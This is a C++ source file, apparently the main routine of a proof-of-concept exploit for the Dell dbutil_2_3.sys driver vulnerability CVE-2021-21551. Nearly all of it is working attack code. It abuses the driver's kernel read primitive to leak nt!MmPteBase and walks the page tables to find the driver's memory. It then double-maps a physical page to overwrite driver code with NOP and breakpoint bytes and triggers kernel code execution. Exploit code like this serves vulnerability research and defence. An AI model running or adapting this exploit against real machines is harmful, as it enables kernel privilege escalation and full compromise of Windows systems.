// CVE-2021-21551.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>
#include <Psapi.h>

#include <iostream>
#include <vector>

#include "DellBiosUtil.h"
#include "resolve.h"

int main()
{
	std::unique_ptr<DellBiosUtil> DellBios = std::make_unique<DellBiosUtil>();
	if (!DellBios->init())
	{
		std::wcerr << "[!] Unable to initialize dbutil_2_3." << std::endl;
		return EXIT_FAILURE;
	}

	UINT64 Nt = 0;
	if (!resolve::BaseAddress(L"ntoskrnl.exe", &Nt))
	{
		std::wcerr << "[!] Unable to resolve ntoskrnl." << std::endl;
		return EXIT_FAILURE;
	}

	UINT64 Dbutil = 0;
	if (!resolve::BaseAddress(L"dbutil_2_3.sys", &Dbutil))
	{
		std::wcerr << "[!] Unable to resolve dbutil_2_3." << std::endl;
		return EXIT_FAILURE;
	}
	Dbutil += 0x1266;

	UINT64 MmPteBase = 0;
	if (!resolve::MmPteBase(Nt, &MmPteBase))
	{
		std::wcerr << "[!] Unable to resolve the Pte base address." << std::endl;
		return EXIT_FAILURE;
	}

	std::wcout << "[+] Leaking nt!MmPtebase...";
	if (!DellBios->Read(MmPteBase, &MmPteBase))
	{
		std::wcerr << "[!] Unable to read Pte base." << std::endl;
		return EXIT_FAILURE;
	}
	else
	{
		std::wcout << "got it." << std::endl;
	}

	std::wcout << "[+] nt!MmPteBase: " << (LPVOID)MmPteBase << std::endl;

	PFILL_PTE_HIERARCHY PteHierarchy = DellBios->MiFillPteHierarchy(Dbutil, MmPteBase);

	std::wcout << "[+] dbutil_2_3's PTE located at: " << (LPVOID)PteHierarchy->PTE << std::endl;

	PAGE_TABLE_ENTRY PteValue;

	bool bUsePte = DellBios->isValidPte(Dbutil, PteHierarchy->PTE);
	if (bUsePte)
	{
		if (!DellBios->Read(PteHierarchy->PTE, &PteValue.value))
		{
			std::wcerr << "[!] Unable to read Pte." << std::endl;
			return EXIT_FAILURE;
		}

		std::wcout << "[+] Pte value: " << (LPVOID)PteValue.value << std::endl;
	}
	else
	{
		if (!DellBios->Read(PteHierarchy->PDE, &PteValue.value))
		{
			std::wcerr << "[!] Unable to read Pte." << std::endl;
			return EXIT_FAILURE;
		}

		std::wcout << "[+] Pde value: " << (LPVOID)PteValue.value << std::endl;
	}

	UINT64 pa = DellBios->VirtualToPhysical(Dbutil, PteValue.flags.Pfn);
	std::wcout << "[+] Physical address: " << (LPVOID)pa << std::endl;

	const int szSize = 79;

	PBYTE patched = new BYTE[szSize];
	RtlFillMemory(patched, szSize, 0x90);
	RtlFillMemory(patched, 1, 0xcc);

	if (!DellBios->DoubleMap(pa, patched, szSize))
	{
		std::wcerr << "[!] Unable to double map." << std::endl;
		return EXIT_FAILURE;
	}

	DellBios->TriggerCodeExec();

	std::wcout << "[+] Done." << std::endl;

	return EXIT_SUCCESS;
}


/// EOF 